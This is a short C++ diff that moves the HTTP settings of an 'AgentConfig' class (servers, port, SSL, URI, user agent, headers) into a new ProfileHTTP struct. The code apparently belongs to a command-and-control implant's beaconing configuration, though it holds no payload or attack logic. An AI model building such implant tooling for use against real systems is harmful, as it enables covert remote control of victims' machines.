@@ -2,6 +2,26 @@
 
 #include <windows.h>
 
+#ifndef PROFILE_STRUCT
+#define PROFILE_STRUCT
+typedef struct {
+	WORD   port;
+	ULONG  servers_count;
+	BYTE** servers;
+	BOOL   use_ssl;
+	BYTE* http_method;
+	BYTE* uri;
+	BYTE* parameter;
+	BYTE* user_agent;
+	BYTE* http_headers;
+	ULONG  ans_pre_size;
+	ULONG  ans_size;
+} ProfileHTTP;
+#endif
+
+
+
+
 class AgentConfig
 {
 public:
@@ -17,17 +37,7 @@ public:
 	ULONG download_chunk_size;
 
 	// HTTP Config
-	WORD   port;
-	ULONG  servers_count;
-	BYTE** servers;
-	BOOL   use_ssl;
-	BYTE*  http_method;
-	BYTE*  uri;
-	BYTE*  parameter;
-	BYTE*  user_agent;
-	BYTE*  http_headers;
-	ULONG  ans_pre_size;
-	ULONG  ans_size;
+	ProfileHTTP profile;
 
 	AgentConfig();
 };
